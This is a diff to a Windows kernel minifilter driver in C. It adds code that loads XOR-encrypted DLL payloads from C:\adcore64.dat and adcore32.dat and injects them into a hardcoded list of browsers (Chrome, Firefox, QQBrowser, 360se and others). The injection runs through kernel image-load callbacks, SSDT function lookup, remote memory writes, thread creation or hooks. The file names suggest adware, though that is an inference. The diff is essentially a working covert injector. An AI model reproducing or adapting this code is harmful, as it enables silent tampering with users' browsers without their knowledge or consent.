@@ -35,14 +35,12 @@ Environment:
 
 #ifdef ALLOC_PRAGMA
 
-
 #pragma alloc_text(PAGE, InstanceSetup)
 #pragma alloc_text(PAGE, CleanVolumCtx)
 #pragma alloc_text(PAGE, InstanceQueryTeardown)
 #pragma alloc_text(INIT, DriverEntry)
 #pragma alloc_text(PAGE, FilterUnload)
 #endif
-
 
 
 /*************************************************************************
@@ -79,22 +77,68 @@ Return Value:
     PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
     PVOID pFoundPattern = NULL;
     UCHAR PreviousModePattern[] = "\x00\x00\xC3";
+    PLIST_ENTRY p=NULL;
 
     UNREFERENCED_PARAMETER( RegistryPath );
 
 
 
-
-    //
     //  Register with FltMgr
-    //
+
+    InitializeListHead(&g_ListProcess);
+    AppendListNode(L"360se.exe");
+    AppendListNode(L"chrome.exe");
+    AppendListNode(L"QQBrowser.exe");
+    AppendListNode(L"2345Explorer.exe");
+    AppendListNode(L"SogouExplorer.exe");
+    AppendListNode(L"baidubrowser.exe");
+    AppendListNode(L"firefox.exe");
+    AppendListNode(L"UCBrowser.exe");
+    AppendListNode(L"liebao.exe");
+    AppendListNode(L"TheWorld.exe");
+    AppendListNode(L"iexplore.exe");
+    AppendListNode(L"360chrome.exe");
+    AppendListNode(L"360chrome.exe");
+    AppendListNode(L"opera.exe");
+
+#ifdef _AMD64_
+    //x64 add code
+    status = MzReadFile(L"\\??\\C:\\adcore64.dat",&g_pDll64,&g_iDll64);
+    if (NT_SUCCESS(status)) {
+        MyDecryptFile(g_pDll64,g_iDll64);
+
+    }
+
+    status = MzReadFile(L"\\??\\C:\\adcore32.dat",&g_pDll32,&g_iDll32);
+    if (NT_SUCCESS(status)) {
+        MyDecryptFile(g_pDll32,g_iDll32);
+    }
+
+#else
+    //x86 add code
+    status = MzReadFile(L"\\??\\C:\\adcore32.dat",&g_pDll32,&g_iDll32);
+    if (NT_SUCCESS(status)) {
+        MyDecryptFile(g_pDll32,g_iDll32);
+    }
 
 
+#endif
+
+
+
+
+    kprintf("g_pDll64:%p g_iDll64:%x g_pDll32:%p g_iDll32:%x",g_pDll64,g_iDll64,g_pDll32,g_iDll32);
+
+
+//  for ( p= g_ListProcess.Flink; p != &g_ListProcess.Flink; p = p->Flink)
+//  {
+//
+//      PMY_PROCESS_INFO  pData = CONTAINING_RECORD(p, MY_PROCESS_INFO, Entry);
+//      kprintf("%s",pData->exename);
+//
+//  }
 
     DriverObject->DriverUnload = DriverUnload;
-
-
-
 #ifdef _AMD64_
     KeServiceDescriptorTable = (PServiceDescriptorTableEntry_t)GetKeServiceDescriptorTable64();
 #else
@@ -123,13 +167,13 @@ Return Value:
 
 
 
-
+    //注册表回调监控
     SetRegisterCallback();
+    //文件回调监控
 
     status = FltRegisterFilter( DriverObject,
                                 &FilterRegistration,
                                 &gFilterHandle);
-
     ASSERT( NT_SUCCESS( status ) );
     if (NT_SUCCESS( status )) {
         //
@@ -328,7 +372,7 @@ Return Value:
             ctx = (PVOLUME_CONTEXT)Context;
             if (ctx->Name.Buffer != NULL) {
 
-                kprintf("[CleanVolumCtx] free volumName:%wZ",&ctx->Name);
+//                kprintf("[CleanVolumCtx] free volumName:%wZ",&ctx->Name);
                 ExFreePool(ctx->Name.Buffer);
                 ctx->Name.Buffer = NULL;
             }
@@ -341,7 +385,7 @@ Return Value:
             if (streamCtx == NULL) break;
             if (streamCtx->FileName.Buffer != NULL) {
 
-                kprintf("[CleanVolumCtx] free streamcontext FileName:%ws",streamCtx->FileName.Buffer);
+//                kprintf("[CleanVolumCtx] free streamcontext FileName:%ws",streamCtx->FileName.Buffer);
                 ExFreePoolWithTag(streamCtx->FileName.Buffer, STRING_TAG);
                 streamCtx->FileName.Length = streamCtx->FileName.MaximumLength = 0;
                 streamCtx->FileName.Buffer = NULL;
@@ -557,10 +601,10 @@ Return Value:
         //  Log debug info
         //
 
-        DbgPrint("[InstanceSetup] SectSize=0x%04x, Used SectSize=0x%04x, Name=\"%wZ\"\n",
-                 volProp->SectorSize,
-                 ctx->SectorSize,
-                 &ctx->Name);
+//        DbgPrint("[InstanceSetup] SectSize=0x%04x, Used SectSize=0x%04x, Name=\"%wZ\"\n",
+//                 volProp->SectorSize,
+//                 ctx->SectorSize,
+//                 &ctx->Name);
 
         //
         //  It is OK for the context to already be defined.
@@ -1600,11 +1644,6 @@ VOID RemoveRegisterCallback()
     }
 }
 
-
-
-
-
-
 NTSTATUS BBSearchPattern(IN PUCHAR pattern, IN UCHAR wildcard, IN ULONG_PTR len, IN const VOID* base, IN ULONG_PTR size, OUT PVOID* ppFound)
 {
     ULONG_PTR i, j;
@@ -1832,6 +1871,11 @@ PVOID GetProcAddress(IN PVOID pBase, IN PCCHAR name_ord)
 }
 
 
+
+
+
+
+
 VOID ImageNotify(PUNICODE_STRING       FullImageName, HANDLE ProcessId, PIMAGE_INFO  ImageInfo)
 {
     PVOID pDrvEntry;
@@ -1850,6 +1894,7 @@ VOID ImageNotify(PUNICODE_STRING       FullImageName, HANDLE ProcessId, PIMAGE_I
     WCHAR *pNonPageBuf = NULL, *pTemp = pTempBuf;
     WCHAR   exename[216] = {0};
     WCHAR     pModuleName[216] = {0};
+    wchar_t* pfindexe = NULL;
     int i = 0;
 
     if(FullImageName == NULL || MmIsAddressValid(FullImageName) == FALSE || FullImageName->Length > 216) {
@@ -1864,90 +1909,160 @@ VOID ImageNotify(PUNICODE_STRING       FullImageName, HANDLE ProcessId, PIMAGE_I
 
     ++pfind;
 
-    if(_wcsicmp(pfind, L"ntdll.dll") == 0) {
-        kprintf("[ImageNotify] find %ws", pTempBuf);
+
+
+    if (_wcsicmp(pfind,L"ntdll.dll")==0) {
+
+        if(!m_pCreateThread || !ZwProtectVirtualMemory || !fnHookfunc || !ZwWriteVirtualMemory) {
+            ZwWriteVirtualMemory = (TYPE_ZwWriteVirtualMemory) GetProcAddress(ImageInfo->ImageBase, "ZwWriteVirtualMemory");
+            ZwCreateThreadEx = (TYPE_NtCreateThreadEx) GetProcAddress(ImageInfo->ImageBase, "ZwCreateThreadEx");        //
+            ZwCreateThread = (TYPE_NtCreateThread) GetProcAddress(ImageInfo->ImageBase, "ZwCreateThread");
+            fnHookfunc = GetProcAddress(ImageInfo->ImageBase, HOOKADDR);
+            ZwProtectVirtualMemory = (TYPE_ZwProtectVirtualMemory) GetProcAddress(ImageInfo->ImageBase, "ZwProtectVirtualMemory");
+            m_pCreateThread = ZwCreateThreadEx == NULL ? (PVOID)ZwCreateThread : (PVOID)ZwCreateThreadEx;
+            kprintf("[ImageNotify] fnHookfunc:%p ZwProtectVirtualMemory:%p m_pCreateThread:%p", fnHookfunc, ZwProtectVirtualMemory, m_pCreateThread);
+
+            if(m_pCreateThread && ZwProtectVirtualMemory && ZwWriteVirtualMemory) {
+                ULONG CreateThreadId = NULL;
+                ULONG protectvmId = NULL;
+                ULONG WriteId = NULL;
+                if(IsX64Module(ImageInfo->ImageBase) == TRUE) {
+                    CreateThreadId = (ULONG)SERVICE_ID64(m_pCreateThread);
+                    protectvmId = (ULONG)SERVICE_ID64(ZwProtectVirtualMemory);
+                    WriteId = (ULONG)SERVICE_ID64(ZwWriteVirtualMemory);
+                } else {
+                    CreateThreadId =   SERVICE_ID32(m_pCreateThread);
+                    protectvmId =   SERVICE_ID32(ZwProtectVirtualMemory);
+                    WriteId = (ULONG)SERVICE_ID32(ZwWriteVirtualMemory);
+                }
+
+                if(CreateThreadId && protectvmId && WriteId) {
+                    NtProtectVirtualMemory = (TYPE_ZwProtectVirtualMemory)GetSSDTFuncCurAddr(protectvmId);
+                    NtWriteVirtualMemory = (TYPE_ZwWriteVirtualMemory)GetSSDTFuncCurAddr(WriteId);
+                    if(m_pCreateThread == ZwCreateThreadEx) {
+                        NtCreateThreadEx = (TYPE_NtCreateThreadEx)GetSSDTFuncCurAddr(CreateThreadId);
+                    } else {
+                        NtCreateThread = (TYPE_NtCreateThread)GetSSDTFuncCurAddr(CreateThreadId);
+                    }
+                    kprintf("[ImageNotify] WriteId:%d CreateThreadId:%d protectvmId:%d", WriteId, CreateThreadId, protectvmId);
+                    kprintf("[ImageNotify] NtWriteVirtualMemory:%p NtProtectVirtualMemory:%p m_pCreateThread:%p", NtWriteVirtualMemory, NtProtectVirtualMemory, m_pCreateThread);
+                }
+            }
+
+        }
+
 
         if(NT_SUCCESS(PsLookupProcessByProcessId(ProcessId, &ProcessObj))) {
 
-            if(!m_pCreateThread || !ZwProtectVirtualMemory || !fnHookfunc || !ZwWriteVirtualMemory) {
-                ZwWriteVirtualMemory = (TYPE_ZwWriteVirtualMemory) GetProcAddress(ImageInfo->ImageBase, "ZwWriteVirtualMemory");
-                ZwCreateThreadEx = (TYPE_NtCreateThreadEx) GetProcAddress(ImageInfo->ImageBase, "ZwCreateThreadEx");        //
-                ZwCreateThread = (TYPE_NtCreateThread) GetProcAddress(ImageInfo->ImageBase, "ZwCreateThread");
-                fnHookfunc = GetProcAddress(ImageInfo->ImageBase, HOOKADDR);
-                ZwProtectVirtualMemory = (TYPE_ZwProtectVirtualMemory) GetProcAddress(ImageInfo->ImageBase, "ZwProtectVirtualMemory");
-                m_pCreateThread = ZwCreateThreadEx == NULL ? (PVOID)ZwCreateThread : (PVOID)ZwCreateThreadEx;
-                kprintf("[ImageNotify] fnHookfunc:%p ZwProtectVirtualMemory:%p m_pCreateThread:%p", fnHookfunc, ZwProtectVirtualMemory, m_pCreateThread);
-
-                if(m_pCreateThread && ZwProtectVirtualMemory && ZwWriteVirtualMemory) {
-                    ULONG CreateThreadId = NULL;
-                    ULONG protectvmId = NULL;
-                    ULONG WriteId = NULL;
-                    if(IsX64Module(ImageInfo->ImageBase) == TRUE) {
-                        CreateThreadId = (ULONG)SERVICE_ID64(m_pCreateThread);
-                        protectvmId = (ULONG)SERVICE_ID64(ZwProtectVirtualMemory);
-                        WriteId = (ULONG)SERVICE_ID64(ZwWriteVirtualMemory);
-                    } else {
-                        CreateThreadId =   SERVICE_ID32(m_pCreateThread);
-                        protectvmId =   SERVICE_ID32(ZwProtectVirtualMemory);
-                        WriteId = (ULONG)SERVICE_ID32(ZwWriteVirtualMemory);
-                    }
-
-                    if(CreateThreadId && protectvmId && WriteId) {
-                        NtProtectVirtualMemory = (TYPE_ZwProtectVirtualMemory)GetSSDTFuncCurAddr(protectvmId);
-                        NtWriteVirtualMemory = (TYPE_ZwWriteVirtualMemory)GetSSDTFuncCurAddr(WriteId);
-                        if(m_pCreateThread == ZwCreateThreadEx) {
-                            NtCreateThreadEx = (TYPE_NtCreateThreadEx)GetSSDTFuncCurAddr(CreateThreadId);
-                        } else {
-                            NtCreateThread = (TYPE_NtCreateThread)GetSSDTFuncCurAddr(CreateThreadId);
-                        }
-                        kprintf("[ImageNotify] WriteId:%d CreateThreadId:%d protectvmId:%d", WriteId, CreateThreadId, protectvmId);
-                        kprintf("[ImageNotify] NtWriteVirtualMemory:%p NtProtectVirtualMemory:%p m_pCreateThread:%p", NtWriteVirtualMemory, NtProtectVirtualMemory, m_pCreateThread);
-                    }
-                }
-
-
-
-            }
-
             pPEB = PsGetProcessPeb==NULL?NULL:PsGetProcessPeb(ProcessObj);
-
-
 #ifdef _AMD64_
+				 if(pPEB && (ULONG64)pPEB < (ULONG64)0xFFFFFFFF) {
 
-            if(pPEB && (ULONG64)pPEB < (ULONG64)0x7FFFFFFF) {
-                if(IsX64Module(ImageInfo->ImageBase) == TRUE) {
-                    BOOLEAN  bfind = GetProcessNameByObj(ProcessObj, exename);
-                    if(bfind == TRUE && _wcsicmp(exename, L"dnf.exe") == 0) {
-                        kprintf("[ImageNotify] x64 32 bit inject");
-                        InjectDll(ProcessObj, 32);
-                    }
-                }
-            } else if(pPEB && ((ULONG64)pPEB > (ULONG64)0x7FFFFFFF)) {
-                BOOLEAN  bfind = GetProcessNameByObj(ProcessObj, exename);
-                if(bfind == TRUE && _wcsicmp(exename, L"dnf64.exe") == 0) {
-                    kprintf("[ImageNotify] x64 64 bit inject");
-                    InjectDll(ProcessObj, 64);
-                }
-            }
+	  					 if(IsX64Module(ImageInfo->ImageBase) == TRUE) {
+	  						 BOOLEAN  bfind = GetProcessNameByObj(ProcessObj, exename);
+	  						 if(bfind == TRUE && IsByInjectProc(exename)) {
+	  							 kprintf("[ImageNotify] x64 32 bit inject pid:%x",PsGetCurrentProcessId());
+	  							 InjectDll(ProcessObj, 32);
+	  						 }
+	  					 }
+
+				 
+//				 						kprintf("x86 pPEB:%p pid:%d",pPEB,PsGetCurrentProcessId());
+										
+				 }else  if(pPEB && (ULONG64)pPEB > (ULONG64)0xFFFFFFFF){
+//					kprintf("x64 pPEB:%p pid:%d",pPEB,PsGetCurrentProcessId());
+				 }
+
+
+//				 x64 pPEB:00000000xFFFFFFFF
 
 
 
+//                  kprintf("pPEB:%p pfind:%ws",pPEB,pfind);
+//                  if(pPEB && (ULONG64)pPEB < (ULONG64)0x7FFFFFFF) {
+//                      if(IsX64Module(ImageInfo->ImageBase) == TRUE) {
+//                          BOOLEAN  bfind = GetProcessNameByObj(ProcessObj, exename);
+//                          if(bfind == TRUE && IsByInjectProc(exename)) {
+//                              kprintf("[ImageNotify] x64 32 bit inject");
+//                              InjectDll(ProcessObj, 32);
+//                          }
+//                      }
+//
+//                  } else if(pPEB && ((ULONG64)pPEB > (ULONG64)0x7FFFFFFF)) {
+//                      BOOLEAN  bfind = GetProcessNameByObj(ProcessObj, exename);
+//                      if(bfind == TRUE && IsByInjectProc(exename)) {
+//                          kprintf("[ImageNotify] x64 64 bit inject");
+////                            InjectDll(ProcessObj, 64);
+//                      }
+//                  }
 #else
 
             if (TRUE) {
                 BOOLEAN   bfind=GetProcessNameByObj(ProcessObj,exename);
-                if (bfind&&_wcsicmp(exename,L"dnf.exe")==0) {
-                    kprintf("[ImageNotify] x32 32 bit inject");
-					InjectDll(ProcessObj, 32);
+                if (bfind&&IsByInjectProc(exename)) {
+                    InjectDll(ProcessObj, 32);
                 }
-
             }
-
 #endif
-
             ObfDereferenceObject(ProcessObj);
         }
+
+
+
+
+
+
     }
+
+
+
+
+//    if(pfindexe&&IsByInjectProc(pfindexe)) {
+//        kprintf("[ImageNotify] find %ws", pTempBuf);
+//
+//        if(NT_SUCCESS(PsLookupProcessByProcessId(ProcessId, &ProcessObj))) {
+//
+//            pPEB = PsGetProcessPeb==NULL?NULL:PsGetProcessPeb(ProcessObj);
+//
+//
+//#ifdef _AMD64_
+//
+//            if(pPEB && (ULONG64)pPEB < (ULONG64)0x7FFFFFFF) {
+//                if(IsX64Module(ImageInfo->ImageBase) == TRUE) {
+//                    BOOLEAN  bfind = GetProcessNameByObj(ProcessObj, exename);
+//                    if(bfind == TRUE && _wcsicmp(exename, L"dnf.exe") == 0) {
+//                        kprintf("[ImageNotify] x64 32 bit inject");
+//                        InjectDll(ProcessObj, 32);
+//                    }
+//                }
+//            } else if(pPEB && ((ULONG64)pPEB > (ULONG64)0x7FFFFFFF)) {
+//                BOOLEAN  bfind = GetProcessNameByObj(ProcessObj, exename);
+//                if(bfind == TRUE && IsByInjectProc(exename)) {
+//                    kprintf("[ImageNotify] x64 64 bit inject");
+//                    InjectDll(ProcessObj, 64);
+//                }
+//            }
+//
+//
+//
+//#else
+////            InjectDll(ProcessObj, 32);
+////            if (TRUE) {
+////                BOOLEAN   bfind=GetProcessNameByObj(ProcessObj,exename);
+////                if (bfind&&IsByInjectProc(exename)) {
+////
+////                    InjectDll(ProcessObj, 32);
+////                }
+////
+////            }
+//
+//#endif
+//
+//            ObfDereferenceObject(ProcessObj);
+//        }
+//    }
+
+
 
 fun_ret:
     return;
@@ -2013,8 +2128,8 @@ void InjectDll(PEPROCESS ProcessObj, int ibit)
         HANDLE ProcessHandle = (HANDLE) - 1;
         PVOID dllbase = NULL;
         ULONG_PTR  ZeroBits = 0;
-        SIZE_T   sizeDll = ibit == 64 ? sizeof(hexDll64) : sizeof(hexDll32);
-        PVOID    pOldDll = ibit == 64 ? hexDll64 : hexDll32;
+        SIZE_T   sizeDll = ibit == 64 ? g_iDll64 : g_iDll32;
+        PVOID    pOldDll = ibit == 64 ? g_pDll64 : g_pDll32;
         SIZE_T   sizeMemLoad = ibit == 64 ? sizeof(MemLoad64) : sizeof(MemLoad);
         PVOID  pOldMemloadBase = ibit == 64 ? (PVOID)MemLoad64 : (PVOID)MemLoad;
         ULONG   uWriteRet = 0;
@@ -2060,7 +2175,7 @@ void InjectDll(PEPROCESS ProcessObj, int ibit)
         status = NewNtWriteVirtualMemory(ProcessHandle, dllbase, pOldDll, sizeDll, &uWriteRet);
 
         if(!NT_SUCCESS(status)) {
-			  kprintf("[InjectDll] NewNtWriteVirtualMemory fail: status:%x write addr:%p size:%x", status,dllbase,sizeDll);
+            kprintf("[InjectDll] NewNtWriteVirtualMemory fail: status:%x write addr:%p size:%x", status,dllbase,sizeDll);
             goto HHHH;
         }
 
@@ -2071,7 +2186,7 @@ void InjectDll(PEPROCESS ProcessObj, int ibit)
         status = NewNtWriteVirtualMemory(ProcessHandle, MemloadBase, pOldMemloadBase, sizeMemLoad, &uWriteRet);
 
         if(!NT_SUCCESS(status)) {
-			kprintf("[InjectDll] NewNtWriteVirtualMemory fail: status:%x write addr:%p size:%x", status,MemloadBase,sizeMemLoad);
+            kprintf("[InjectDll] NewNtWriteVirtualMemory fail: status:%x write addr:%p size:%x", status,MemloadBase,sizeMemLoad);
             goto HHHH;
         }
 
@@ -2125,26 +2240,120 @@ void InjectDll(PEPROCESS ProcessObj, int ibit)
                 RtlCopyMemory(fnHookfunc, jumpcode, sizeof(jumpcode));
             }
         } else {
+
             OBJECT_ATTRIBUTES ob = { 0 };
             HANDLE hThread = (HANDLE) - 1;
             InitializeObjectAttributes(&ob, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
             status = NewNtCreateThreadEx(&hThread, 0x1FFFFF, &ob, ProcessHandle, MemloadBase, pParambase, NULL, 0, NULL, NULL, NULL);
-          
-
+            //kprintf("NewNtCreateThreadEx status:%x",status);
             if(NT_SUCCESS(status)) {
                 ZwClose(hThread);
-            }else{
-				  kprintf("[InjectDll] NewNtCreateThreadEx fail status:%x", status);
-			}
+            } else {
+                kprintf("[InjectDll] NewNtCreateThreadEx fail status:%x", status);
+            }
         }
-
-
-
-
     HHHH:
         ZwClose(ProcessHandle);
     }
 }
 
 
+
+NTSTATUS AppendListNode(CONST WCHAR name[])
+{
+    PMY_PROCESS_INFO  pInfo=(PMY_PROCESS_INFO)kmalloc(sizeof(MY_PROCESS_INFO));
+    if (NULL == pInfo) {
+        return STATUS_INSUFFICIENT_RESOURCES;
+    }
+    wcscpy(pInfo->exename,name);
+    InsertHeadList(&g_ListProcess,(PLIST_ENTRY)&pInfo->Entry);
+    return STATUS_SUCCESS;
+}
+
+BOOLEAN  IsByInjectProc(const WCHAR* name)
+{
+    PLIST_ENTRY p;
+    BOOLEAN bret=FALSE;
+    for ( p= g_ListProcess.Flink; p != &g_ListProcess.Flink; p = p->Flink) {
+
+        PMY_PROCESS_INFO  pData = CONTAINING_RECORD(p, MY_PROCESS_INFO, Entry);
+
+        if(_wcsicmp(pData->exename,name)==0) {
+
+            bret=TRUE;
+            break;
+        }
+
+    }
+    return bret;
+
+}
+
+
+
+NTSTATUS MzReadFile(LPWCH pFile,PVOID* ImageBaseAddress,PULONG ImageSize)
+{
+    HANDLE    hDestFile=NULL;
+    ULONG     ret=0;
+    OBJECT_ATTRIBUTES obj_attrib;
+    IO_STATUS_BLOCK Io_Status_Block = {0};
+    NTSTATUS status=0;
+    LARGE_INTEGER    offset = {0};
+    ULONG    length = 0;
+    UNICODE_STRING ustrSrcFile= {0};
+    PVOID  pdata1=NULL;
+    RtlInitUnicodeString(&ustrSrcFile,pFile);
+    InitializeObjectAttributes(&obj_attrib,&ustrSrcFile,OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,NULL,NULL);
+
+    status = ZwCreateFile(&hDestFile,GENERIC_READ,&obj_attrib,&Io_Status_Block,NULL,\
+                          FILE_ATTRIBUTE_NORMAL,FILE_SHARE_READ,FILE_OPEN,\
+                          FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,NULL,0);
+
+    if(NT_SUCCESS(status)) {
+
+        length=MzGetFileSize(hDestFile);
+        if(length>0) {
+            pdata1=kmalloc(length);
+            if(pdata1) {
+                status = ZwReadFile(hDestFile,NULL, NULL,NULL, &Io_Status_Block,pdata1,length,&offset,NULL);
+
+                if (NT_SUCCESS(status)) {
+                    *ImageSize=Io_Status_Block.Information;
+                    *ImageBaseAddress=pdata1;
+                    ret=status;
+                } else {
+                    kprintf("[MzReadFile] %ws ZwReadFile error :%x ",pFile,status);
+                }
+
+
+            }
+
+
+        }
+        ZwClose(hDestFile);
+
+    }
+    return status;
+}
+
+ULONG MzGetFileSize(HANDLE hfile)
+{
+    NTSTATUS ntStatus=0;
+    IO_STATUS_BLOCK iostatus= {0};
+    FILE_STANDARD_INFORMATION fsi= {0};
+    ntStatus=ZwQueryInformationFile(hfile,&iostatus,&fsi,sizeof(FILE_STANDARD_INFORMATION),FileStandardInformation);
+    if(!NT_SUCCESS(ntStatus))
+        return 0;
+    return fsi.EndOfFile.QuadPart;
+}
+
+void MyDecryptFile(PVOID pdata, int len)
+{
+    int i = 0;
+    char* p1 = (char*)pdata;
+
+    for(i = 0; i < len; i++) {
+        p1[i] = 16 ^ p1[i];
+    }
+}
 
